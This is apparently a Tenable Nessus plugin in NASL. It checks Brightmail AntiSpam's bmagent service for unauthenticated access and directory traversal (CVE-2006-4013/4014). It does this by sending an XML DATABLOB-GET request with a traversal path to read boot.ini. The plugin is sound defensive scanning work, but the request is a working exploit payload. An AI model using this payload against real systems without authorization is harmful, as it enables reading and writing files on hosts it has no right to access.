#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22158);
  script_version("$Revision: 1.21 $");

  script_cve_id("CVE-2006-4013", "CVE-2006-4014");
  script_bugtraq_id(19182);
  script_osvdb_id(27589, 27590);

  script_name(english:"Brightmail AntiSpam bmagent Multiple Remote Vulnerabilities (DoS, Traversal)");
  script_summary(english:"Tries to read a local file using Brightmail Agent");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Brightmail AntiSpam, an antispam and anti-
virus filter for mail servers, and includes Brightmail Agent, a web
server intended to be used by a Brightmail Control Center to manage
the Brightmail Scanner. 

The version of Brightmail Agent installed on the remote host does not
require authentication and thus allows attackers to gain
administrative control of the affected application.  An attacker can
exploit this issue to stop or disable the Brightmail Scanner's
services, which could disrupt mail delivery for legitimate users; or
to read and write to files associated with the application, which
could result in the disclosure of sensitive information or
reconfiguration of the application itself. 

In addition, the Brightmail Agent suffers from a directory traversal
vulnerability such that reads and writes are not limited to the
application's directory.  Successful exploitation of this issue may
result in a complete compromise of the affected host since, under
Windows, the application runs with LOCAL SYSTEM privileges." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e069763f" );
 script_set_attribute(attribute:"solution", value:
"Either restrict access to Brightmail Agent (refer to document id
2004123109522163 in Symantec's Support Knowledge Base) or upgrade to
Symantec Brightmail AntiSpam 6.0.4 / Symantec Mail Security for SMTP
5.0 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);


 script_set_attribute(attribute:"plugin_publication_date", value: "2006/08/04");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/07/27");
 script_cvs_date("$Date: 2016/05/04 14:30:40 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 41002);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:41002);

# Unless we're paranoid, make sure the banner looks like bmagent.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "HTTP/1.1 404 NotOK" >!< banner) exit(0);
}


# Try to exploit the flaw to read a file.
file = "$CONFIGDIR$$/$..$/$..$/$..$/$..$/$..$/$..$/$..$/$..$/$boot.ini";
rid = string(unixtime(), rand() % 1000);
postdata = string(
  '<?xml version="1.0" encoding="utf-8" ?>', 
  "<REQUEST>",
  "  <DATABLOB-GET>",
  "    <REQUEST-ID>", rid, "</REQUEST-ID>",
  "    <FLAG>0</FLAG>",
  "    <FILE-NAME>", file, "</FILE-NAME>",
  "  </DATABLOB-GET>",
  "</REQUEST>"
);
r = http_send_recv3(method: "POST", item: "/", version: 11, data: postdata, port: port,
  add_headers: make_array("Content-Type", "text/plain; charset=ISO-8859-1",
  	       "User-Agent", "Jakarta Commons-HttpClient/2.0final"));
if (isnull(r)) exit(0);
res = r[2];

# Extract the contents of the file.
pat = "<DATABLOB-BASE64.+>(.+)</DATABLOB-BASE64>";
matches = egrep(pattern:pat, string:res);
content = NULL;
if (matches)
{
  foreach match (split(matches))
  {
    match = chomp(match);
    content = eregmatch(pattern:pat, string:match);
    if (!isnull(content)) 
    {
      content = content[1];
      content = base64_decode(str:content);
      break;
    }
  }
}


# There's a problem if looks like boot.ini.
if (content && "[boot loader]">< content)
{
  report = string(
    "Here are the contents of the file '\\boot.ini' that Nessus\n",
    "was able to read from the remote host :\n",
    "\n",
    content
  );
  security_hole(port:port, extra:report);
}
